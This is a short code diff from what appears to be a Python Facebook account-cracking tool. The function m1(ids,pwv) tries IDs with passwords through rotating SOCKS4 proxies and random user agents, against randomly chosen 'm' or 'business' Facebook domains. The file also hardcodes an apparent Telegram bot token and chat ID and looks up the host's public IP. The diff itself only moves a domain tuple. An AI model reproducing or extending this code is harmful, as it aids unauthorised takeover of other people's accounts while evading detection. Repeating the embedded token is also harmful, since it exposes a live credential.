@@ -193,7 +193,6 @@ mtd,cp_xdx,cokix=[],[],[]
 token = ('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')
 ID = ('1778046662')
 ip = requests.get('https://api.ipify.org').text.strip()
-DOMAIN = (m,business)
 orange = "\x1b[38;5;196m"
 yellow = "\x1b[38;5;208m"
 black="\033[1;30m"
@@ -704,6 +703,7 @@ def m1(ids,pwv):
     nip=random.choice(proxsi)
     proxs= {'http': 'socks4://'+nip}
     ua = ua_valid()
+    DOMAIN = ("m","business")
     fb= random.choice(DOMAIN)
     warna = random.choice(my_color)
     try:
